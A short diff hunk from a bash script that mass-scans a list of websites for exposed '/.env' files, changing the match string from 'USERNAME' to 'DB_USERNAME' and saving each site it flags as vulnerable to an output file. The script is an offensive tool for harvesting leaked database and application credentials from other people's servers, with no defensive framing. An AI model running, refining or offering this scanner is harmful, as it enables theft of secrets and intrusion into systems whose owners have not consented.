@@ -40,7 +40,7 @@ printf "\n${lightgreen}Sek Lurr...\n\n"
 for site in $(cat $list);
 do
 ((cthread=cthread%LIMITATOR)); ((cthread++==0)) && wait
-if [[ $(curl --connect-timeout 0 --max-time 3 -kLs "${site}/.env" ) =~ "USERNAME" ]]; then
+if [[ $(curl --connect-timeout 0 --max-time 3 -kLs "${site}/.env" ) =~ "DB_USERNAME" ]]; then
   printf "${white}[+] ${site} is ${lightgreen} vuln\n"
   echo "$site/.env" >> ${sv}
 
